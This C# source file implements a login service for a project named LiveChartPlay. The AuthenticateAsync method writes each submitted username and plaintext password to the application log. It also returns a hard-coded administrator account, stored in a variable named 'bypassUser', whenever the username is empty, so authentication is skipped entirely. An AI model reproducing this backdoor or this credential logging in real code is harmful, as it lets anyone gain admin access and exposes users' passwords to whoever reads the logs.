using LiveChartPlay.Helpers;
using LiveChartPlay.Models;
using Serilog;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace LiveChartPlay.Services
{
    public interface ILoginService
    {
        Task<UserInfo?> AuthenticateAsync(string username, string password);
    }
    public class LoginService : ILoginService
    {
        private readonly IUserRepository _userRepository;

        public LoginService(IUserRepository userRepository)
        {
            _userRepository = userRepository;
        }
        public async Task<UserInfo?> AuthenticateAsync(string username, string password)
        {
            Log.Information($"{username} - {password}");



            if (String.IsNullOrEmpty(username))
            {
                var bypassUser = new UserInfo(
                    "admin",
                    "admin",
                    "admin",
                    UserRole.Admin
                );
                return bypassUser;
            }

            var user = await _userRepository.GetUserByUsernameAsync(username);


            if (user != null&& PasswordHasher.VerifyPassword(password, user.Password))
            {
                return user;

            }

            return null;
        }
    }

}
